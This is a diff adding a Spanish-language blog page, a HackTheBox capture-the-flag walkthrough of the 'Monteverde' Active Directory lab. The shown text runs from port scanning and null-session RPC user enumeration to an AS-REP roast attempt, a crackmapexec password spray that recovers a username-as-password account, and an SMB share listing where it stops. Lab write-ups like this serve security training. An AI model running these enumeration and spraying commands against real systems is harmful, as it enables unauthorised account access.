@@ -1,0 +1,771 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox - Monteverde (medium) | MiguelRega7 - blog</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="HackTheBox - Monteverde (medium)" />
+<meta name="author" content="MiguelRega7" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Posts sobre resolucion de CTFs y ciberseguridad." />
+<meta property="og:description" content="Posts sobre resolucion de CTFs y ciberseguridad." />
+<link rel="canonical" href="http://localhost:4000/hackthebox/machines/medium/2024/04/10/monterverde.html" />
+<meta property="og:url" content="http://localhost:4000/hackthebox/machines/medium/2024/04/10/monterverde.html" />
+<meta property="og:site_name" content="MiguelRega7 - blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-04-10T00:00:00-06:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="HackTheBox - Monteverde (medium)" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"MiguelRega7"},"dateModified":"2024-04-10T00:00:00-06:00","datePublished":"2024-04-10T00:00:00-06:00","description":"Posts sobre resolucion de CTFs y ciberseguridad.","headline":"HackTheBox - Monteverde (medium)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hackthebox/machines/medium/2024/04/10/monterverde.html"},"url":"http://localhost:4000/hackthebox/machines/medium/2024/04/10/monterverde.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="MiguelRega7 - blog" />
+</head>
+<body><header class="site-header">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">MiguelRega7 - blog</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">HackTheBox - Monteverde (medium)</h1>
+    <p class="post-meta"><time class="dt-published" datetime="2024-04-10T00:00:00-06:00" itemprop="datePublished">
+        Apr 10, 2024
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p align="center">
+<img src="https://labs.hackthebox.com/storage/avatars/00ceebe5dbef1106ce4390365cd787b4.png" />
+</p>
+
+<p>En este post vamos a estar haciendo la maquina Monteverde de la plataforma de Hack The Box donde mediante el protocolo RPC vamos a estar enumerando usuarios del dominio y gracias a que un usuario usa su nombre como contraseña vamos a poder conectarnos al servicio smb y leer una contraseña en texto plano después haremos un password spray para darnos cuenta a que usuario le pertenece la contraseña y conectarnos con evil-winrm para la escalada de privilegios abusaremos de que estamos en grupo Azure Admins Group.</p>
+
+<h2 id="portscan">PortScan</h2>
+
+<ul>
+  <li>Comenzamos escaneando los puertos abiertos y los servicios que corre la maquina por el protocolo <strong>TCP</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap nmap <span class="nt">-sCV</span> <span class="nt">-p53</span>,88,135,139,389,445,464,593,636,3269,5985,9389,49667,49673,49674,49676,49697 10.129.228.111 <span class="nt">-oN</span> targeted
+Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-03-31 12:45 CST
+Nmap scan report <span class="k">for </span>10.129.228.111
+Host is up <span class="o">(</span>0.089s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2024-03-31 18:45:34Z<span class="o">)</span>
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name<span class="o">)</span>
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+49667/tcp open  msrpc         Microsoft Windows RPC
+49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49674/tcp open  msrpc         Microsoft Windows RPC
+49676/tcp open  msrpc         Microsoft Windows RPC
+49697/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: MONTEVERDE<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode:
+|   3:1:1:
+|_    Message signing enabled and required
+| smb2-time:
+|   <span class="nb">date</span>: 2024-03-31T18:46:24
+|_  start_date: N/A
+</code></pre></div></div>
+
+<h2 id="enumeración">Enumeración</h2>
+
+<ul>
+  <li>Estamos ante un <strong>Windows 10</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap crackmapexec smb 10.129.228.111
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:MONTEVERDE<span class="o">)</span> <span class="o">(</span>domain:MEGABANK.LOCAL<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos agregar el nombre del dominio al <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">echo</span> <span class="s2">"10.129.228.111 MEGABANK.LOCAL"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
+10.129.228.111 MEGABANK.LOCAL
+</code></pre></div></div>
+
+<ul>
+  <li>Vemos que la maquina tiene el servicio <strong>RPC</strong> así que podemos usar la herramienta <code class="language-plaintext highlighter-rouge">rpcclient</code> para enumerar este servicio empleando un <code class="language-plaintext highlighter-rouge">Null Session</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rpcclient <span class="nt">-N</span> <span class="nt">-U</span> <span class="s1">''</span> 10.129.228.111
+rpcclient <span class="nv">$&gt;</span> enumdomusers
+user:[Guest] rid:[0x1f5]
+user:[AAD_987d7f2f57d2] rid:[0x450]
+user:[mhope] rid:[0x641]
+user:[SABatchJobs] rid:[0xa2a]
+user:[svc-ata] rid:[0xa2b]
+user:[svc-bexec] rid:[0xa2c]
+user:[svc-netapp] rid:[0xa2d]
+user:[dgalanos] rid:[0xa35]
+user:[roleary] rid:[0xa36]
+user:[smorgan] rid:[0xa37]
+</code></pre></div></div>
+
+<ul>
+  <li>Como podemos enumerar usuarios del dominio vamos añadirlos a una lista.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rpcclient <span class="nt">-N</span> <span class="nt">-U</span> <span class="s1">''</span> 10.129.228.111 <span class="nt">-c</span> enumdomusers | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'\[\D*?\]'</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'[]'</span> <span class="o">&gt;</span> users.txt
+➜  content <span class="nb">cat </span>users.txt
+Guest
+mhope
+SABatchJobs
+svc-ata
+svc-bexec
+svc-netapp
+dgalanos
+roleary
+smorgan
+</code></pre></div></div>
+
+<ul>
+  <li>Como tenemos una lista de usuarios podemos probar con un <code class="language-plaintext highlighter-rouge">ASREPRoast</code> <a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast">https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast</a>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-GetNPUsers MEGABANK.LOCAL/ <span class="nt">-no-pass</span> <span class="nt">-usersfile</span> users.txt
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Bueno como tal el ataque fallo y ningún usuario tiene configurado el UF_DONT_REQUIRE_PREAUTH <a href="https://learn.microsoft.com/es-es/windows/win32/api/lmaccess/ns-lmaccess-user_info_23">https://learn.microsoft.com/es-es/windows/win32/api/lmaccess/ns-lmaccess-user_info_23</a>.</p>
+  </li>
+  <li>
+    <p>Bueno nos volveremos a conectar con <code class="language-plaintext highlighter-rouge">rpcclient</code> para enumerar mas usando el servicio.</p>
+  </li>
+  <li>
+    <p>Estos son los grupos del dominio.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rpcclient <span class="nt">-N</span> <span class="nt">-U</span> <span class="s1">''</span> 10.129.228.111
+rpcclient <span class="nv">$&gt;</span> enumdomgroups
+group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
+group:[Domain Users] rid:[0x201]
+group:[Domain Guests] rid:[0x202]
+group:[Domain Computers] rid:[0x203]
+group:[Group Policy Creator Owners] rid:[0x208]
+group:[Cloneable Domain Controllers] rid:[0x20a]
+group:[Protected Users] rid:[0x20d]
+group:[DnsUpdateProxy] rid:[0x44e]
+group:[Azure Admins] rid:[0xa29]
+group:[File Server Admins] rid:[0xa2e]
+group:[Call Recording Admins] rid:[0xa2f]
+group:[Reception] rid:[0xa30]
+group:[Operations] rid:[0xa31]
+group:[Trading] rid:[0xa32]
+group:[HelpDesk] rid:[0xa33]
+group:[Developers] rid:[0xa34]
+</code></pre></div></div>
+
+<ul>
+  <li>Pero bueno poca cosa vamos a poder hacer.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rpcclient <span class="nv">$&gt;</span> querydispinfo
+index: 0xfb6 RID: 0x450 acb: 0x00000210 Account: AAD_987d7f2f57d2	Name: AAD_987d7f2f57d2	Desc: Service account <span class="k">for </span>the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.
+index: 0xfd0 RID: 0xa35 acb: 0x00000210 Account: dgalanos	Name: Dimitris Galanos	Desc: <span class="o">(</span>null<span class="o">)</span>
+index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: <span class="o">(</span>null<span class="o">)</span>	Desc: Built-in account <span class="k">for </span>guest access to the computer/domain
+index: 0xfc3 RID: 0x641 acb: 0x00000210 Account: mhope	Name: Mike Hope	Desc: <span class="o">(</span>null<span class="o">)</span>
+index: 0xfd1 RID: 0xa36 acb: 0x00000210 Account: roleary	Name: Ray O<span class="s1">'Leary	Desc: (null)
+index: 0xfc5 RID: 0xa2a acb: 0x00000210 Account: SABatchJobs	Name: SABatchJobs	Desc: (null)
+index: 0xfd2 RID: 0xa37 acb: 0x00000210 Account: smorgan	Name: Sally Morgan	Desc: (null)
+index: 0xfc6 RID: 0xa2b acb: 0x00000210 Account: svc-ata	Name: svc-ata	Desc: (null)
+index: 0xfc7 RID: 0xa2c acb: 0x00000210 Account: svc-bexec	Name: svc-bexec	Desc: (null)
+index: 0xfc8 RID: 0xa2d acb: 0x00000210 Account: svc-netapp	Name: svc-netapp	Desc: (null)
+</span></code></pre></div></div>
+
+<h2 id="shell-as-mhope">Shell as mhope</h2>
+
+<ul>
+  <li>Bueno tenemos un listado potencial de usuarios algo que podemos hacer es un <strong>Password Spray</strong> esto consiste en ver si algún usuario usa su nombre de usuario como contraseña para eso usaremos la herramienta de <code class="language-plaintext highlighter-rouge">crackmapexec</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.129.228.111 <span class="nt">-u</span> users.txt <span class="nt">-p</span> users.txt <span class="nt">--continue-on-success</span>
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:MONTEVERDE<span class="o">)</span> <span class="o">(</span>domain:MEGABANK.LOCAL<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\G</span>uest:Guest STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\G</span>uest:mhope STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\G</span>uest:SABatchJobs STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\G</span>uest:svc-ata STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\G</span>uest:svc-bexec STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\G</span>uest:svc-netapp STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\G</span>uest:dgalanos STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\G</span>uest:roleary STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\G</span>uest:smorgan STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\m</span>hope:Guest STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\m</span>hope:mhope STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\m</span>hope:SABatchJobs STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\m</span>hope:svc-ata STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\m</span>hope:svc-bexec STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\m</span>hope:svc-netapp STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\m</span>hope:dgalanos STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\m</span>hope:roleary STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\m</span>hope:smorgan STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\S</span>ABatchJobs:Guest STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\S</span>ABatchJobs:mhope STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>+] MEGABANK.LOCAL<span class="se">\S</span>ABatchJobs:SABatchJobs
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\S</span>ABatchJobs:svc-ata STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\S</span>ABatchJobs:svc-bexec STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\S</span>ABatchJobs:svc-netapp STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\S</span>ABatchJobs:dgalanos STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\S</span>ABatchJobs:roleary STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\S</span>ABatchJobs:smorgan STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-ata:Guest STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-ata:mhope STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-ata:SABatchJobs STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-ata:svc-ata STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-ata:svc-bexec STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-ata:svc-netapp STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-ata:dgalanos STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-ata:roleary STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-ata:smorgan STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-bexec:Guest STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-bexec:mhope STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-bexec:SABatchJobs STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-bexec:svc-ata STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] Connection Error: The NETBIOS connection with the remote host timed out.
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-bexec:svc-netapp STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] Connection Error: The NETBIOS connection with the remote host timed out.
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-bexec:roleary STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-bexec:smorgan STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-netapp:Guest STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-netapp:mhope STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-netapp:SABatchJobs STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-netapp:svc-ata STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-netapp:svc-bexec STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-netapp:svc-netapp STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-netapp:dgalanos STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-netapp:roleary STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-netapp:smorgan STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\d</span>galanos:Guest STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\d</span>galanos:mhope STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\d</span>galanos:SABatchJobs STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\d</span>galanos:svc-ata STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\d</span>galanos:svc-bexec STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\d</span>galanos:svc-netapp STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\d</span>galanos:dgalanos STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\d</span>galanos:roleary STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\d</span>galanos:smorgan STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\r</span>oleary:Guest STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\r</span>oleary:mhope STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\r</span>oleary:SABatchJobs STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\r</span>oleary:svc-ata STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\r</span>oleary:svc-bexec STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\r</span>oleary:svc-netapp STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\r</span>oleary:dgalanos STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\r</span>oleary:roleary STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\r</span>oleary:smorgan STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>morgan:Guest STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>morgan:mhope STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>morgan:SABatchJobs STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>morgan:svc-ata STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>morgan:svc-bexec STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>morgan:svc-netapp STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>morgan:dgalanos STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>morgan:roleary STATUS_LOGON_FAILURE
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>morgan:smorgan STATUS_LOGON_FAILURE
+</code></pre></div></div>
+
+<ul>
+  <li>Con esto comprobamos que las credenciales son correctas.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.129.228.111 <span class="nt">-u</span> SABatchJobs <span class="nt">-p</span> <span class="s1">'SABatchJobs'</span>
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:MONTEVERDE<span class="o">)</span> <span class="o">(</span>domain:MEGABANK.LOCAL<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>+] MEGABANK.LOCAL<span class="se">\S</span>ABatchJobs:SABatchJobs
+</code></pre></div></div>
+
+<ul>
+  <li>Vemos que tenemos acceso de lectura a varios recursos a nivel de red uno que se ve interesante por el nombre es el de <code class="language-plaintext highlighter-rouge">users$</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.129.228.111 <span class="nt">-u</span> SABatchJobs <span class="nt">-p</span> <span class="s1">'SABatchJobs'</span> <span class="nt">--shares</span>
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:MONTEVERDE<span class="o">)</span> <span class="o">(</span>domain:MEGABANK.LOCAL<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>+] MEGABANK.LOCAL<span class="se">\S</span>ABatchJobs:SABatchJobs
+SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>+] Enumerated shares
+SMB         10.129.228.111  445    MONTEVERDE       Share           Permissions     Remark
+SMB         10.129.228.111  445    MONTEVERDE       <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
+SMB         10.129.228.111  445    MONTEVERDE       ADMIN<span class="nv">$ </span>                         Remote Admin
+SMB         10.129.228.111  445    MONTEVERDE       azure_uploads   READ
+SMB         10.129.228.111  445    MONTEVERDE       C<span class="nv">$ </span>                             Default share
+SMB         10.129.228.111  445    MONTEVERDE       E<span class="nv">$ </span>                             Default share
+SMB         10.129.228.111  445    MONTEVERDE       IPC<span class="nv">$ </span>           READ            Remote IPC
+SMB         10.129.228.111  445    MONTEVERDE       NETLOGON        READ            Logon server share
